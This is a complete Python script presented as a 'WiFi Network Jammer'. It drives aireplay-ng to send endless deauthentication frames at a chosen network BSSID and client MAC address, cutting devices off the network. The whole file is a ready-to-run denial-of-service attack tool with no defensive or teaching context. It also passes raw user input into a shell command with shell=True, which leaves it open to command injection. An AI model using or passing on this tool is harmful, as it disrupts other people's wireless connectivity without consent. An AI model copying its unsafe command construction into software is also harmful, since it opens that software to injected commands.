import os
import subprocess

# Function to perform deauthentication attack using aircrack-ng
def jam_network(interface, target_bssid, target_client):
    try:
        cmd = f"aireplay-ng --deauth 0 -a {target_bssid} -c {target_client} {interface}"
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print("Error executing aircrack-ng:", e)

# Main function
def main():
    print("WiFi Network Jammer (using aircrack-ng)")

    while True:
        print("\nMenu:")
        print("1. Jam a WiFi Network")
        print("2. Exit")

        choice = input("Enter your choice (1/2): ")

        if choice == '1':
            # Set your wireless interface
            interface = input("Set your Wireless Interface: ")
            target_bssid = input("Enter the BSSID of the target network: ")
            target_client = input("Enter the MAC address of a connected client (optional): ")

            # Perform deauthentication attack using aircrack-ng
            print("Jamming in progress...")
            jam_network(interface, target_bssid, target_client)
        elif choice == '2':
            print("Exiting the program.")
            break
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
